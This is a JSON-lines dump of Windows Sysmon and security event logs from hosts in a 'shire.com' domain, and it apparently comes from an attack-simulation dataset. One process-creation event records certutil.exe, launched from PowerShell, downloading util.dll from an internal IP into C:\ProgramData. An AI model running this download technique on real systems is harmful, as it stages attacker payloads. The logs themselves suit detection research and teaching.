{"@timestamp":"2019-10-28T02:31:37.922Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"winlog":{"process":{"pid":3980,"thread":{"id":5276}},"record_id":207881,"computer_name":"HR001.shire.com","event_data":{"TargetImage":"C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|c:\\windows\\system32\\rasmans.dll+3751b|c:\\windows\\system32\\rasmans.dll+36fad|c:\\windows\\system32\\rasmans.dll+10ed8|c:\\windows\\system32\\rasmans.dll+33cd5|C:\\Windows\\System32\\svchost.exe+314c|C:\\Windows\\System32\\sechost.dll+2de2|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71","SourceProcessGUID":"{a158f72c-a36e-5db5-0000-0010f8fd0200}","SourceProcessId":"4228","SourceImage":"C:\\Windows\\System32\\svchost.exe","GrantedAccess":"0x1400","UtcTime":"2019-10-28 02:31:37.922","SourceThreadId":"4364","TargetProcessGUID":"{a158f72c-a36d-5db5-0000-0010fdb50200}","TargetProcessId":"3860"},"channel":"Microsoft-Windows-Sysmon/Operational","provider_name":"Microsoft-Windows-Sysmon","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","event_id":10,"task":"Process accessed (rule: ProcessAccess)","api":"wineventlog","opcode":"Info","version":3},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"event":{"action":"Process accessed (rule: ProcessAccess)","created":"2019-10-28T02:31:40.428Z","kind":"event","code":10},"log":{"level":"information"},"message":"Process accessed:\nRuleName: \nUtcTime: 2019-10-28 02:31:37.922\nSourceProcessGUID: {a158f72c-a36e-5db5-0000-0010f8fd0200}\nSourceProcessId: 4228\nSourceThreadId: 4364\nSourceImage: C:\\Windows\\System32\\svchost.exe\nTargetProcessGUID: {a158f72c-a36d-5db5-0000-0010fdb50200}\nTargetProcessId: 3860\nTargetImage: C:\\Program Files\\Amazon\\Ec2ConfigService\\Ec2Config.exe\nGrantedAccess: 0x1400\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|c:\\windows\\system32\\rasmans.dll+3751b|c:\\windows\\system32\\rasmans.dll+36fad|c:\\windows\\system32\\rasmans.dll+10ed8|c:\\windows\\system32\\rasmans.dll+33cd5|C:\\Windows\\System32\\svchost.exe+314c|C:\\Windows\\System32\\sechost.dll+2de2|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71"}
{"@timestamp":"2019-10-28T02:31:39.735Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"message":"The Windows Filtering Platform has permitted a bind to a local port.\n\nApplication Information:\n\tProcess ID:\t\t3860\n\tApplication Name:\t\\device\\harddiskvolume2\\program files\\amazon\\ec2configservice\\ec2config.exe\n\nNetwork Information:\n\tSource Address:\t\t0.0.0.0\n\tSource Port:\t\t54223\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t0\n\tLayer Name:\t\tResource Assignment\n\tLayer Run-Time ID:\t36","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c"},"winlog":{"task":"Filtering Platform Connection","opcode":"Info","provider_name":"Microsoft-Windows-Security-Auditing","computer_name":"HR001.shire.com","process":{"pid":4,"thread":{"id":5732}},"event_data":{"LayerName":"%%14608","LayerRTID":"36","ProcessId":"3860","Application":"\\device\\harddiskvolume2\\program files\\amazon\\ec2configservice\\ec2config.exe","SourceAddress":"0.0.0.0","SourcePort":"54223","Protocol":"6","FilterRTID":"0"},"event_id":5158,"record_id":32701,"api":"wineventlog","keywords":["Audit Success"],"channel":"security","provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}"},"event":{"kind":"event","code":5158,"action":"Filtering Platform Connection","created":"2019-10-28T02:31:41.434Z"},"log":{"level":"information"}}
{"@timestamp":"2019-10-28T02:31:39.735Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"message":"The Windows Filtering Platform has permitted a connection.\n\nApplication Information:\n\tProcess ID:\t\t3860\n\tApplication Name:\t\\device\\harddiskvolume2\\program files\\amazon\\ec2configservice\\ec2config.exe\n\nNetwork Information:\n\tDirection:\t\tOutbound\n\tSource Address:\t\t172.18.39.106\n\tSource Port:\t\t54223\n\tDestination Address:\t169.254.169.254\n\tDestination Port:\t\t80\n\tProtocol:\t\t6\n\nFilter Information:\n\tFilter Run-Time ID:\t67266\n\tLayer Name:\t\tConnect\n\tLayer Run-Time ID:\t48","winlog":{"version":1,"event_data":{"SourcePort":"54223","DestAddress":"169.254.169.254","FilterRTID":"67266","LayerName":"%%14611","LayerRTID":"48","ProcessID":"3860","SourceAddress":"172.18.39.106","Protocol":"6","RemoteMachineID":"S-1-0-0","RemoteUserID":"S-1-0-0","Direction":"%%14593","DestPort":"80","Application":"\\device\\harddiskvolume2\\program files\\amazon\\ec2configservice\\ec2config.exe"},"event_id":5156,"record_id":32702,"provider_guid":"{54849625-5478-4994-a5ba-3e3b0328c30d}","api":"wineventlog","keywords":["Audit Success"],"process":{"pid":4,"thread":{"id":5732}},"provider_name":"Microsoft-Windows-Security-Auditing","task":"Filtering Platform Connection","computer_name":"HR001.shire.com","opcode":"Info","channel":"security"},"event":{"action":"Filtering Platform Connection","created":"2019-10-28T02:31:41.434Z","kind":"event","code":5156},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c"},"log":{"level":"information"}}
{"@timestamp":"2019-10-28T02:31:41.361Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"winlog":{"record_id":566,"event_id":800,"event_data":{"param2":"\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=529\n\n\tUserId=shire\\lrodriguez\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.1\n\tHostId=f0314d0f-c454-40a3-ad17-590da3d6c06e\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.18362.1\n\tRunspaceId=0081cb2b-4a53-48ac-bc50-97b1bfbc8d98\n\tPipelineId=243\n\tScriptName=\n\tCommandLine=","param3":"CommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\""},"provider_name":"PowerShell","computer_name":"ACCT001.shire.com","opcode":"Info","keywords":["Classic"],"channel":"Windows PowerShell","task":"Pipeline Execution Details","api":"wineventlog"},"event":{"kind":"event","code":800,"action":"Pipeline Execution Details","created":"2019-10-28T02:31:41.434Z"},"log":{"level":"information"},"message":"Pipeline execution details for command line: . \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=529\n\n\tUserId=shire\\lrodriguez\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.1\n\tHostId=f0314d0f-c454-40a3-ad17-590da3d6c06e\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.18362.1\n\tRunspaceId=0081cb2b-4a53-48ac-bc50-97b1bfbc8d98\n\tPipelineId=243\n\tScriptName=\n\tCommandLine= \n\nDetails: \nCommandInvocation(PSConsoleHostReadLine): \"PSConsoleHostReadLine\"","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:41.375Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"agent":{"hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c"},"log":{"level":"information"},"message":"Process Create:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.373\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: CertUtil.exe\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: CertUtil.exe\nCommandLine: \"C:\\Windows\\system32\\certutil.exe\" -urlcache -split -f http://172.18.39.8/util.dll C:\\ProgramData\\util.dll\nCurrentDirectory: C:\\\nUser: shire\\lrodriguez\nLogonGuid: {a158f72c-a39d-5db5-0000-00206cf80600}\nLogonId: 0x6F86C\nTerminalSessionId: 1\nIntegrityLevel: Medium\nHashes: SHA1=41875CABE350022579F070EC2A059C9806770474,MD5=DE9C75F34F47B60A71BBA03760F0579E,SHA256=12F06D3B1601004DB3F7F1A07E7D3AF4CC838E890E0FF50C51E4A0C9366719ED,IMPHASH=336674CB3C8337BDE2C22255345BFF43\nParentProcessGuid: {a158f72c-3a9b-5db6-0000-001001de8b00}\nParentProcessId: 2780\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","winlog":{"event_id":1,"api":"wineventlog","task":"Process Create (rule: ProcessCreate)","opcode":"Info","process":{"thread":{"id":5108},"pid":3208},"user":{"name":"SYSTEM","domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18"},"version":5,"event_data":{"CurrentDirectory":"C:\\","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","OriginalFileName":"CertUtil.exe","ProcessId":"3728","Hashes":"SHA1=41875CABE350022579F070EC2A059C9806770474,MD5=DE9C75F34F47B60A71BBA03760F0579E,SHA256=12F06D3B1601004DB3F7F1A07E7D3AF4CC838E890E0FF50C51E4A0C9366719ED,IMPHASH=336674CB3C8337BDE2C22255345BFF43","Company":"Microsoft Corporation","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","Image":"C:\\Windows\\System32\\certutil.exe","User":"shire\\lrodriguez","CommandLine":"\"C:\\Windows\\system32\\certutil.exe\" -urlcache -split -f http://172.18.39.8/util.dll C:\\ProgramData\\util.dll","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","LogonGuid":"{a158f72c-a39d-5db5-0000-00206cf80600}","IntegrityLevel":"Medium","ParentProcessId":"2780","ParentProcessGuid":"{a158f72c-3a9b-5db6-0000-001001de8b00}","UtcTime":"2019-10-28 02:31:41.373","Description":"CertUtil.exe","Product":"Microsoft Windows Operating System","LogonId":"0x6f86c","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","TerminalSessionId":"1"},"channel":"Microsoft-Windows-Sysmon/Operational","provider_name":"Microsoft-Windows-Sysmon","record_id":271574,"computer_name":"ACCT001.shire.com","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"},"event":{"kind":"event","code":1,"action":"Process Create (rule: ProcessCreate)","created":"2019-10-28T02:31:41.434Z"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:41.375Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"event":{"kind":"event","code":10,"action":"Process accessed (rule: ProcessAccess)","created":"2019-10-28T02:31:41.434Z"},"log":{"level":"information"},"message":"Process accessed:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.361\nSourceProcessGUID: {a158f72c-3a9b-5db6-0000-001001de8b00}\nSourceProcessId: 2780\nSourceThreadId: 5228\nSourceImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetProcessGUID: {a158f72c-530d-5db6-0000-001062e9af00}\nTargetProcessId: 3728\nTargetImage: C:\\Windows\\system32\\certutil.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d8d4|C:\\Windows\\System32\\KERNELBASE.dll+5e4c0|C:\\Windows\\System32\\KERNELBASE.dll+5c056|C:\\Windows\\System32\\KERNEL32.DLL+1bc03|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\ab7db4bb476e741e1f09a230a3b50d63\\System.ni.dll+384236|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\ab7db4bb476e741e1f09a230a3b50d63\\System.ni.dll+2c4809|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\ab7db4bb476e741e1f09a230a3b50d63\\System.ni.dll+2c4179|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\62416e11eb31c778aac11127159a555d\\System.Management.Automation.ni.dll+200f2079|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\62416e11eb31c778aac11127159a555d\\System.Management.Automation.ni.dll+2004949a|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\62416e11eb31c778aac11127159a555d\\System.Management.Automation.ni.dll+200d39dd|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\62416e11eb31c778aac11127159a555d\\System.Management.Automation.ni.dll+200d369b|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\62416e11eb31c778aac11127159a555d\\System.Management.Automation.ni.dll+201d6a6f|UNKNOWN(00007FFEBF665251)","winlog":{"task":"Process accessed (rule: ProcessAccess)","record_id":271575,"api":"wineventlog","computer_name":"ACCT001.shire.com","opcode":"Info","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"event_data":{"TargetProcessId":"3728","GrantedAccess":"0x1fffff","SourceProcessId":"2780","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9d8d4|C:\\Windows\\System32\\KERNELBASE.dll+5e4c0|C:\\Windows\\System32\\KERNELBASE.dll+5c056|C:\\Windows\\System32\\KERNEL32.DLL+1bc03|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\ab7db4bb476e741e1f09a230a3b50d63\\System.ni.dll+384236|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\ab7db4bb476e741e1f09a230a3b50d63\\System.ni.dll+2c4809|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\ab7db4bb476e741e1f09a230a3b50d63\\System.ni.dll+2c4179|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\62416e11eb31c778aac11127159a555d\\System.Management.Automation.ni.dll+200f2079|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\62416e11eb31c778aac11127159a555d\\System.Management.Automation.ni.dll+2004949a|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\62416e11eb31c778aac11127159a555d\\System.Management.Automation.ni.dll+200d39dd|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\62416e11eb31c778aac11127159a555d\\System.Management.Automation.ni.dll+200d369b|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System.Manaa57fc8cc#\\62416e11eb31c778aac11127159a555d\\System.Management.Automation.ni.dll+201d6a6f|UNKNOWN(00007FFEBF665251)","UtcTime":"2019-10-28 02:31:41.361","SourceThreadId":"5228","TargetProcessGUID":"{a158f72c-530d-5db6-0000-001062e9af00}","TargetImage":"C:\\Windows\\system32\\certutil.exe","SourceProcessGUID":"{a158f72c-3a9b-5db6-0000-001001de8b00}","SourceImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"},"provider_name":"Microsoft-Windows-Sysmon","version":3,"process":{"pid":3208,"thread":{"id":5108}},"channel":"Microsoft-Windows-Sysmon/Operational","event_id":10},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"}}
{"@timestamp":"2019-10-28T02:31:41.375Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"winlog":{"event_data":{"GrantedAccess":"0x1fffff","UtcTime":"2019-10-28 02:31:41.361","SourceThreadId":"7040","SourceImage":"C:\\Windows\\system32\\csrss.exe","TargetProcessGUID":"{a158f72c-530d-5db6-0000-001062e9af00}","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\system32\\basesrv.DLL+2fba|C:\\Windows\\SYSTEM32\\CSRSRV.dll+5af4|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce7f","SourceProcessId":"676","TargetProcessId":"3728","TargetImage":"C:\\Windows\\system32\\certutil.exe","SourceProcessGUID":"{a158f72c-a38f-5db5-0000-0010ff5f0000}"},"channel":"Microsoft-Windows-Sysmon/Operational","provider_name":"Microsoft-Windows-Sysmon","task":"Process accessed (rule: ProcessAccess)","computer_name":"ACCT001.shire.com","opcode":"Info","user":{"name":"SYSTEM","domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18"},"version":3,"record_id":271576,"process":{"pid":3208,"thread":{"id":5108}},"event_id":10,"api":"wineventlog","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"},"event":{"kind":"event","code":10,"action":"Process accessed (rule: ProcessAccess)","created":"2019-10-28T02:31:41.434Z"},"log":{"level":"information"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"message":"Process accessed:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.361\nSourceProcessGUID: {a158f72c-a38f-5db5-0000-0010ff5f0000}\nSourceProcessId: 676\nSourceThreadId: 7040\nSourceImage: C:\\Windows\\system32\\csrss.exe\nTargetProcessGUID: {a158f72c-530d-5db6-0000-001062e9af00}\nTargetProcessId: 3728\nTargetImage: C:\\Windows\\system32\\certutil.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\system32\\basesrv.DLL+2fba|C:\\Windows\\SYSTEM32\\CSRSRV.dll+5af4|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce7f"}
{"@timestamp":"2019-10-28T02:31:41.376Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"agent":{"id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0","type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer"},"event":{"code":7,"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:41.434Z","kind":"event"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.361\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\certutil.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: CertUtil.exe\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: CertUtil.exe\nHashes: SHA1=41875CABE350022579F070EC2A059C9806770474,MD5=DE9C75F34F47B60A71BBA03760F0579E,SHA256=12F06D3B1601004DB3F7F1A07E7D3AF4CC838E890E0FF50C51E4A0C9366719ED,IMPHASH=336674CB3C8337BDE2C22255345BFF43\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","winlog":{"opcode":"Info","channel":"Microsoft-Windows-Sysmon/Operational","event_id":7,"record_id":271577,"api":"wineventlog","computer_name":"ACCT001.shire.com","user":{"type":"User","identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY"},"process":{"pid":3208,"thread":{"id":5108}},"event_data":{"Signature":"Microsoft Windows","Description":"CertUtil.exe","ImageLoaded":"C:\\Windows\\System32\\certutil.exe","Signed":"true","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","Company":"Microsoft Corporation","Product":"Microsoft Windows Operating System","OriginalFileName":"CertUtil.exe","SignatureStatus":"Valid","UtcTime":"2019-10-28 02:31:41.361","Image":"C:\\Windows\\System32\\certutil.exe","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","ProcessId":"3728","Hashes":"SHA1=41875CABE350022579F070EC2A059C9806770474,MD5=DE9C75F34F47B60A71BBA03760F0579E,SHA256=12F06D3B1601004DB3F7F1A07E7D3AF4CC838E890E0FF50C51E4A0C9366719ED,IMPHASH=336674CB3C8337BDE2C22255345BFF43"},"provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","task":"Image loaded (rule: ImageLoad)","provider_name":"Microsoft-Windows-Sysmon","version":3},"ecs":{"version":"1.1.0"},"host":{"name":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:41.376Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.361\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\ntdll.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: NT Layer DLL\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: ntdll.dll\nHashes: SHA1=C5085044059F466DF8C513B615AAF2F43DCD2ADA,MD5=3239D9CDC68757AB4620B3AC127E18C5,SHA256=D6DA3BB97F6839436A9399D087138CA44B50E5674C4C8093CE41A4C1658C7259,IMPHASH=00000000000000000000000000000000\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"winlog":{"api":"wineventlog","channel":"Microsoft-Windows-Sysmon/Operational","opcode":"Info","version":3,"user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"computer_name":"ACCT001.shire.com","process":{"pid":3208,"thread":{"id":5108}},"provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","event_data":{"Description":"NT Layer DLL","Hashes":"SHA1=C5085044059F466DF8C513B615AAF2F43DCD2ADA,MD5=3239D9CDC68757AB4620B3AC127E18C5,SHA256=D6DA3BB97F6839436A9399D087138CA44B50E5674C4C8093CE41A4C1658C7259,IMPHASH=00000000000000000000000000000000","ImageLoaded":"C:\\Windows\\System32\\ntdll.dll","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","UtcTime":"2019-10-28 02:31:41.361","ProcessId":"3728","SignatureStatus":"Valid","Product":"Microsoft Windows Operating System","Company":"Microsoft Corporation","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","Signed":"true","Signature":"Microsoft Windows","Image":"C:\\Windows\\System32\\certutil.exe","OriginalFileName":"ntdll.dll"},"event_id":7,"record_id":271578,"task":"Image loaded (rule: ImageLoad)"},"event":{"kind":"event","code":7,"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:41.434Z"}}
{"@timestamp":"2019-10-28T02:31:41.377Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"agent":{"type":"winlogbeat","ephemeral_id":"df5ad137-6594-4bd7-a3eb-e0eda670370c","hostname":"WECServer","id":"f8e32ecf-6ac8-4748-86ec-f026490623c4","version":"7.4.0"},"winlog":{"event_id":7,"provider_name":"Microsoft-Windows-Sysmon","computer_name":"ACCT001.shire.com","opcode":"Info","user":{"identifier":"S-1-5-18","name":"SYSTEM","domain":"NT AUTHORITY","type":"User"},"task":"Image loaded (rule: ImageLoad)","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","version":3,"event_data":{"ProcessId":"3728","ImageLoaded":"C:\\Windows\\System32\\kernel32.dll","OriginalFileName":"kernel32","Signed":"true","SignatureStatus":"Valid","Description":"Windows NT BASE API Client DLL","Product":"Microsoft Windows Operating System","UtcTime":"2019-10-28 02:31:41.376","Image":"C:\\Windows\\System32\\certutil.exe","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","Hashes":"SHA1=B4016D4A9016F977587BD5E4D194148ED350A3D2,MD5=AEC7A212F781FDEE765290B97F44816D,SHA256=1D96FBCDE4FBC5E55F439D08AE1F42136153C7F92DBB64C5A98592365122DE4E,IMPHASH=F9F97E60CFCD78BE051D9570C88FFB6F","Company":"Microsoft Corporation","Signature":"Microsoft Windows"},"channel":"Microsoft-Windows-Sysmon/Operational","record_id":271579,"api":"wineventlog","process":{"pid":3208,"thread":{"id":5108}}},"event":{"kind":"event","code":7,"action":"Image loaded (rule: ImageLoad)","created":"2019-10-28T02:31:41.434Z"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.376\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\kernel32.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows NT BASE API Client DLL\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: kernel32\nHashes: SHA1=B4016D4A9016F977587BD5E4D194148ED350A3D2,MD5=AEC7A212F781FDEE765290B97F44816D,SHA256=1D96FBCDE4FBC5E55F439D08AE1F42136153C7F92DBB64C5A98592365122DE4E,IMPHASH=F9F97E60CFCD78BE051D9570C88FFB6F\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","ecs":{"version":"1.1.0"},"host":{"name":"WECServer"}}
{"@timestamp":"2019-10-28T02:31:41.377Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.4.0","topic":"winlogbeat"},"log":{"level":"information"},"message":"Image loaded:\nRuleName: \nUtcTime: 2019-10-28 02:31:41.376\nProcessGuid: {a158f72c-530d-5db6-0000-001062e9af00}\nProcessId: 3728\nImage: C:\\Windows\\System32\\certutil.exe\nImageLoaded: C:\\Windows\\System32\\KernelBase.dll\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows NT BASE API Client DLL\nProduct: Microsoft Windows Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Kernelbase.dll\nHashes: SHA1=3A200170DB32A6FB4A82764086D6E2427C9A9A33,MD5=F6749BD7C5D1E8E4BB687091254D23D6,SHA256=4C51E2E15CA843D8F121656329C1B363FA1E65484C5989E89173D4389126E7A8,IMPHASH=EE04B80B0375B4716981CFBD3F0E9003\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid","winlog":{"process":{"pid":3208,"thread":{"id":5108}},"record_id":271580,"opcode":"Info","user":{"name":"SYSTEM","domain":"NT AUTHORITY","type":"User","identifier":"S-1-5-18"},"api":"wineventlog","event_data":{"OriginalFileName":"Kernelbase.dll","SignatureStatus":"Valid","Signature":"Microsoft Windows","ProcessId":"3728","Company":"Microsoft Corporation","Hashes":"SHA1=3A200170DB32A6FB4A82764086D6E2427C9A9A33,MD5=F6749BD7C5D1E8E4BB687091254D23D6,SHA256=4C51E2E15CA843D8F121656329C1B363FA1E65484C5989E89173D4389126E7A8,IMPHASH=EE04B80B0375B4716981CFBD3F0E9003","Image":"C:\\Windows\\System32\\certutil.exe","ImageLoaded":"C:\\Windows\\System32\\KernelBase.dll","Description":"Windows NT BASE API Client DLL","ProcessGuid":"{a158f72c-530d-5db6-0000-001062e9af00}","FileVersion":"10.0.18362.1 (WinBuild.160101.0800)","Signed":"true","UtcTime":"2019-10-28 02:31:41.376","Product":"Microsoft Windows Operating System"},"provider_name":"Microsoft-Windows-Sysmon","task":"Image loaded (rule: ImageLoad)","version":3,"channel":"Microsoft-Windows-Sysmon/Operational","event_id":7,"computer_name":"ACCT001.shire.com","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"},"event":{"code":7,"action":"Image loaded (rule: 